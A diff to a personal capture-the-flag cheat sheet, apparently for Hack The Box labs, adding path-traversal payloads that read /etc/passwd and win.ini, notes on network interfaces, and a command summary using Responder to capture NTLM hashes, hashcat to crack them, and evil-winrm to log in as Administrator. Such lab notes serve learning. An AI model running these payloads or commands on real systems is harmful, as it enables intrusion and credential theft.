@@ -321,4 +321,30 @@ done | nc localhost 30002
 - **Hidden Doors:** If the website has no login, use Gobuster + common.txt.
 - **Extensions:** Use '-x php,html,txt' to find specific file types.
 - **Flag Location:** Usually behind an admin panel or a hidden directory.
-- **To check for files inside the website, run:** gobuster dir -u http://[IP] -w ~/Programs/.Wordlists/common.txt -x php,html
+- **To check for files inside the website, run:** gobuster dir -u http://[IP] -w ~/Programs/Hack/.Wordlists/common.txt -x php,html
+
+---
+## 📄 LFI (LOCAL FILE INCLUSION)
+- **Concept:** Exploiting a web parameter to read system files.
+- **Windows Test:** /index.php?view=../../../../windows/win.ini
+- **Linux Test:** /index.php?view=../../../../etc/passwd
+- **Common Params:** view, page, file, lang, path
+
+---
+## 🧗 DIRECTORY TRAVERSAL (LFI)
+- **Windows Goal:** Read C:\Windows\win.ini
+- **Payload:** index.php?page=../../../../../../../../windows/win.ini
+- **Why many ../?** It ensures you reach the root (C:\) even if the web folder is buried deep.
+
+---
+## 🌐 COMMON NETWORK FLAGS
+- **-i / -I [interface]:** Specifies which network card to use (e.g., -I tun0).
+- **tun0:** The virtual interface created by OpenVPN for Hack The Box.
+- **eth0 / wlan0:** Physical Ethernet or Wi-Fi interfaces.
+
+## 🛠️ SESSION COMMANDS SUMMARY
+* **Capture:** sudo responder -I wlan0 -rdwv "Shouting version" | sudo responder -I wlan0 -rv "Stealthy version"
+* **Crack:** hashcat -m 5600 hash.txt .Wordlists/rockyou.txt
+* **Access:** evil-winrm -i [IP] -u Administrator -p [PASSWORD]
+* **Search Flags:** Get-ChildItem -Path C:\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue
+* **Read Flag:** type C:\Users\Administrator\Desktop\flag.txt
